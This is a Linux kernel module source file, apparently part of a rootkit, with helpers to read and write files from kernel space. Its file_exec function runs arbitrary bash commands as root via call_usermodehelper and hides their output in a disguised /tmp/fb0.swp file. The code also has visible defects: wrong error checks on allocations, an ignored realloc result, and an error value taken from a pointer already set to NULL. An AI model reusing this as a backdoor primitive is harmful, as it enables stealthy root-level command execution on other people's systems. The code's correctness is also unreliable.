#include <linux/types.h>
#include <linux/slab.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/umh.h>

#include "../sys/mem.h"

int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
{
    struct file *file;
    char *tmp_buf;
    int retv = 0;

    pr_err("[*] going to open file\n");
    file = filp_open(filename, O_RDONLY | (force_o_largefile() ? O_LARGEFILE : 0), 0);
    if (IS_ERR(file))
    {
        pr_err("[!] failed to open file\n");
        return PTR_ERR(file);
    }

    tmp_buf = kzmalloc(4096, GFP_KERNEL);
    if (IS_ERR(tmp_buf))
    {
        retv = PTR_ERR(tmp_buf);
        goto LAB_OUT_NO_FILP;
    }

    pr_err("[*] reading file '%s'...\n", filename);
    retv = kernel_read(file, tmp_buf, 4096, NULL);
    if (retv < 0)
    {
        pr_err("[!] failed to read file\n");
        goto LAB_OUT;
    }

    *out_buflen = retv;
    *out_buf = kzmalloc(*out_buflen, GFP_KERNEL);
    if (IS_ERR(*out_buf))
    {
        *out_buf = NULL;
        *out_buflen = 0;
        retv = PTR_ERR(*out_buf);

        goto LAB_OUT;
    }

    memcpy(*out_buf, tmp_buf, *out_buflen);

    while (retv == 4096)
    {
        pr_err("[*] reading more file...\n");
        retv = kernel_read(file, tmp_buf, 4096, NULL);
        if (retv < 0)
        {
            pr_err("[!] failed to read bytes\n");
            goto LAB_OUT;
        }
    
        kzrealloc(*out_buf, *out_buflen, *out_buflen + retv);
        memcpy(*out_buf + *out_buflen, tmp_buf, retv);
        *out_buflen += retv;
    }

LAB_OUT:
    filp_close(file, NULL);
LAB_OUT_NO_FILP:
    kzfree(tmp_buf, 4096);

    if (retv >= 0)
        return 0;

    return retv;
}

int file_write(const char *filename, const u8 *content, size_t content_len)
{
    struct file *file;
    int retv;

    file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0);
    if (IS_ERR(file))
    {
        pr_err("[!] failed to open file\n");
        return PTR_ERR(file);
    }

    pr_err("[*] writing to '%s' size: %ld\n", filename, content_len);
    retv = kernel_write(file, content, content_len, 0);
    filp_close(file, NULL);
    if (retv < 0)
    {
        pr_err("[!] failed to write to file\n");
        return retv;
    }
    
    return retv;
}

int file_exec(char *cmd, u8 **out_buf, size_t *out_buflen)
{
    #define SHELL_PATH "/bin/bash"
    #define STDOUT_FILE "/tmp/fb0.swp"
    #define BASH_POSTFIX " 1>" STDOUT_FILE " 2>\\&1"

    char* envp[] = {"HOME=/", "PWD=/", "TERM=linux", "USER=root", "SHELL=" SHELL_PATH, "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    char* argv[] = {SHELL_PATH, "-c", NULL, NULL};
    size_t bash_cmd_len;
    int cmd_retv;
    int retv;

    bash_cmd_len = strlen(cmd) + strlen(BASH_POSTFIX) + 1; 
    
    argv[2] = kzmalloc(bash_cmd_len, GFP_KERNEL);
    if (IS_ERR(argv[2]))
        return PTR_ERR(argv[2]);

    sprintf(argv[2], "%s%s", cmd, BASH_POSTFIX);

    pr_err("[*] executing: \"%s %s '%s'\"\n", argv[0], argv[1], argv[2]);
    cmd_retv = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
    kzfree(argv[2], bash_cmd_len);

    retv = file_read(STDOUT_FILE, out_buf, out_buflen);
    pr_err("[+] read %d bytes\n", retv);
    if (retv < 0)
        return retv;

    return cmd_retv;
}